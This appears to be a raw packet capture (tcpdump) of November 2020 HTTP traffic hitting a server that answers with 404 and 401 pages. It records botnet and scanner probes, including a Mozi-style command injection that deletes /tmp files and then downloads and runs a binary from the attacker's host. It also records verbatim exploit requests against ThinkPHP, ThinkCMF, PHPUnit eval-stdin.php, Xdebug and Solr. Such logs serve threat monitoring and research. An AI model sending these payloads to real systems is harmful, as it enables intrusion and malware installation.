
16:44:07.249310 IP (tos 0x0, ttl 52, id 15472, offset 0, flags [DF], proto TCP (6), length 322)
    115.59.76.213.46588 > 46.21.150.52.80: Flags [P.], cksum 0xf85f (correct), seq 19753154:19753424, ack 2263032001, win 908, options [nop,nop,TS val 2253918 ecr 134274], length 270: HTTP, length: 270
	GET /shell?cd+/tmp;rm+-rf+*;wget+http://115.59.76.213:51409/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1
	User-Agent: Hello, world
	Host: 46.21.150.52:80
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Connection: keep-alive
	
16:44:07.260854 IP (tos 0x0, ttl 62, id 11389, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 115.59.76.213.46588: Flags [P.], cksum 0x2540 (correct), seq 1:293, ack 270, win 972, options [nop,nop,TS val 134478 ecr 2253918], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:44:06 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:44:07.967207 IP (tos 0x0, ttl 62, id 11391, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 115.59.76.213.46588: Flags [P.], cksum 0x2399 (correct), seq 1:293, ack 270, win 972, options [nop,nop,TS val 134655 ecr 2254164], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:44:06 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:32.153399 IP (tos 0x0, ttl 54, id 17707, offset 0, flags [DF], proto TCP (6), length 333)
    91.241.19.84.40476 > 46.21.150.52.80: Flags [P.], cksum 0xf97a (correct), seq 533567801:533568082, ack 4073313033, win 83, options [nop,nop,TS val 1957546225 ecr 230653], length 281: HTTP, length: 281
	POST /api/jsonws/invoke HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Content-Length: 0
	Content-Type: application/json
	Accept-Encoding: gzip
	Connection: close
	
16:50:32.157197 IP (tos 0x0, ttl 62, id 22054, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.40476: Flags [P.], cksum 0xd39b (correct), seq 1:293, ack 281, win 972, options [nop,nop,TS val 230701 ecr 1957546225], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:31 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:32.182081 IP (tos 0x0, ttl 54, id 34365, offset 0, flags [DF], proto TCP (6), length 376)
    91.241.19.84.40500 > 46.21.150.52.80: Flags [P.], cksum 0x6491 (correct), seq 767791812:767792136, ack 4067789277, win 83, options [nop,nop,TS val 1957546251 ecr 230654], length 324: HTTP, length: 324
	GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Accept-Encoding: gzip
	Connection: close
	
16:50:32.183633 IP (tos 0x0, ttl 62, id 3306, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.40500: Flags [P.], cksum 0x1537 (correct), seq 1:293, ack 324, win 972, options [nop,nop,TS val 230708 ecr 1957546251], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:31 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:32.628611 IP (tos 0x0, ttl 54, id 48559, offset 0, flags [DF], proto TCP (6), length 348)
    91.241.19.84.42078 > 46.21.150.52.80: Flags [P.], cksum 0xbd59 (correct), seq 3906065560:3906065856, ack 4081958467, win 83, options [nop,nop,TS val 1957546700 ecr 230766], length 296: HTTP, length: 296
	GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Content-Type: application/json
	Accept-Encoding: gzip
	Connection: close
	
16:50:32.629621 IP (tos 0x0, ttl 54, id 48765, offset 0, flags [DF], proto TCP (6), length 353)
    91.241.19.84.45434 > 46.21.150.52.80: Flags [P.], cksum 0x9aa1 (correct), seq 2247827920:2247828221, ack 4084878656, win 83, options [nop,nop,TS val 1957546703 ecr 230772], length 301: HTTP, length: 301
	GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Content-Length: 19
	Accept-Encoding: gzip
	Connection: close
	
	<?=md5("phpunit")?>[!http]
16:50:32.636623 IP (tos 0x0, ttl 62, id 15329, offset 0, flags [DF], proto TCP (6), length 1104)
    46.21.150.52.80 > 91.241.19.84.42078: Flags [P.], cksum 0x0733 (correct), seq 1:1053, ack 296, win 972, options [nop,nop,TS val 230821 ecr 1957546700], length 1052: HTTP, length: 1052
	HTTP/1.1 401 Unauthorized
	Server: 
	Date: Sun, 15 Nov 2020 16:50:31 GMT
	WWW-Authenticate: Basic realm="NETGEAR DGN1000 "
	Content-Type: text/html
	Connection: close
	
	<html>
	<head>
	<META http-equiv="Pragma" CONTENT="no-cache">
	<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">	
	<meta HTTP-EQUIV="Expires" CONTENT="Mon, 06 Jan 1990 00:00:01 GMT"> 
	
	
	<meta name="description" content="DG834N 1049">
	<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
	
		
	 
	
	
	
	
	
	
	<title> Authorization warning</title>
	</head>
	
	<body bgcolor="#ffffff">
	<p><font size=4 color="#0099cc" face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>Warning</font></p>
	
	<hr color="#0099cc">
	
	<p align="center"><b><font size=3 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>System Authentication Failed.</font></b></p>
	
	<p align="center"><BR><font size=-1 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>
	Please contact your system administrator for the correct information.</font></p>
	
	</body>
	</html>
	</BODY>
	</HTML>
16:50:32.638580 IP (tos 0x0, ttl 62, id 51429, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.45434: Flags [P.], cksum 0x5426 (correct), seq 1:293, ack 301, win 972, options [nop,nop,TS val 230822 ecr 1957546703], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:31 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:33.063664 IP (tos 0x0, ttl 54, id 6364, offset 0, flags [DF], proto TCP (6), length 294)
    91.241.19.84.59894 > 46.21.150.52.80: Flags [P.], cksum 0xfc9f (correct), seq 3281785318:3281785560, ack 4086872545, win 83, options [nop,nop,TS val 1957547126 ecr 230877], length 242: HTTP, length: 242
	GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Accept-Encoding: gzip
	Connection: close
	
16:50:33.066746 IP (tos 0x0, ttl 62, id 16370, offset 0, flags [DF], proto TCP (6), length 1104)
    46.21.150.52.80 > 91.241.19.84.59894: Flags [P.], cksum 0xabb8 (correct), seq 1:1053, ack 242, win 972, options [nop,nop,TS val 230929 ecr 1957547126], length 1052: HTTP, length: 1052
	HTTP/1.1 401 Unauthorized
	Server: 
	Date: Sun, 15 Nov 2020 16:50:32 GMT
	WWW-Authenticate: Basic realm="NETGEAR DGN1000 "
	Content-Type: text/html
	Connection: close
	
	<html>
	<head>
	<META http-equiv="Pragma" CONTENT="no-cache">
	<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">	
	<meta HTTP-EQUIV="Expires" CONTENT="Mon, 06 Jan 1990 00:00:01 GMT"> 
	
	
	<meta name="description" content="DG834N 1049">
	<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
	
		
	 
	
	
	
	
	
	
	<title> Authorization warning</title>
	</head>
	
	<body bgcolor="#ffffff">
	<p><font size=4 color="#0099cc" face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>Warning</font></p>
	
	<hr color="#0099cc">
	
	<p align="center"><b><font size=3 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>System Authentication Failed.</font></b></p>
	
	<p align="center"><BR><font size=-1 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>
	Please contact your system administrator for the correct information.</font></p>
	
	</body>
	</html>
	</BODY>
	</HTML>
16:50:33.455541 IP (tos 0x0, ttl 54, id 62928, offset 0, flags [DF], proto TCP (6), length 272)
    91.241.19.84.42802 > 46.21.150.52.80: Flags [P.], cksum 0x5ec0 (correct), seq 1659973747:1659973967, ack 4089352693, win 83, options [nop,nop,TS val 1957547525 ecr 230978], length 220: HTTP, length: 220
	GET /console/ HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Accept-Encoding: gzip
	Connection: close
	
16:50:33.456844 IP (tos 0x0, ttl 62, id 6024, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.42802: Flags [P.], cksum 0x292b (correct), seq 1:293, ack 220, win 972, options [nop,nop,TS val 231026 ecr 1957547525], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:32 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:33.657887 IP (tos 0x0, ttl 62, id 51431, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.45434: Flags [P.], cksum 0x525d (correct), seq 1:293, ack 301, win 972, options [nop,nop,TS val 231077 ecr 1957546905], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:31 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:33.841456 IP (tos 0x0, ttl 54, id 20350, offset 0, flags [DF], proto TCP (6), length 403)
    91.241.19.84.53130 > 46.21.150.52.80: Flags [P.], cksum 0x8d8c (correct), seq 2302931755:2302932106, ack 4094651731, win 83, options [nop,nop,TS val 1957547912 ecr 231074], length 351: HTTP, length: 351
	POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Content-Length: 19
	Content-Type: application/x-www-form-urlencoded
	Accept-Encoding: gzip
	Connection: close
	
	<?=md5("phpunit")?>[!http]
16:50:33.843818 IP (tos 0x0, ttl 62, id 60290, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.53130: Flags [P.], cksum 0x38b2 (correct), seq 1:293, ack 351, win 972, options [nop,nop,TS val 231123 ecr 1957547912], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:33 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:34.066003 IP (tos 0x0, ttl 54, id 12335, offset 0, flags [DF], proto TCP (6), length 294)
    91.241.19.84.44094 > 46.21.150.52.80: Flags [P.], cksum 0x8d46 (correct), seq 4008682165:4008682407, ack 4099263326, win 83, options [nop,nop,TS val 1957548139 ecr 231125], length 242: HTTP, length: 242
	GET /solr/admin/info/system?wt=json HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Accept-Encoding: gzip
	Connection: close
	
16:50:34.068452 IP (tos 0x0, ttl 62, id 19542, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.44094: Flags [P.], cksum 0xe7c8 (correct), seq 1:293, ack 242, win 972, options [nop,nop,TS val 231179 ecr 1957548139], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:33 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:34.666474 IP (tos 0x0, ttl 62, id 60292, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.53130: Flags [P.], cksum 0x37e4 (correct), seq 1:293, ack 351, win 972, options [nop,nop,TS val 231329 ecr 1957547912], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:33 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
16:50:34.911606 IP (tos 0x0, ttl 54, id 30591, offset 0, flags [DF], proto TCP (6), length 309)
    91.241.19.84.51440 > 46.21.150.52.80: Flags [P.], cksum 0x603b (correct), seq 856971971:856972228, ack 4112282743, win 83, options [nop,nop,TS val 1957548981 ecr 231318], length 257: HTTP, length: 257
	GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1
	Host: 46.21.150.52:80
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
	Accept-Encoding: gzip
	Connection: close
	
16:50:34.913698 IP (tos 0x0, ttl 62, id 62399, offset 0, flags [DF], proto TCP (6), length 344)
    46.21.150.52.80 > 91.241.19.84.51440: Flags [P.], cksum 0x1fd9 (correct), seq 1:293, ack 257, win 972, options [nop,nop,TS val 231390 ecr 1957548981], length 292: HTTP, length: 292
	HTTP/1.1 404 Not Found
	Server: 
	Date: Sun, 15 Nov 2020 16:50:34 GMT
	Content-Type: text/html
	Connection: close
	
	<HTML>
	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
	<H4>404 Not Found</H4>
	File not found.
	</BODY>
	</HTML>
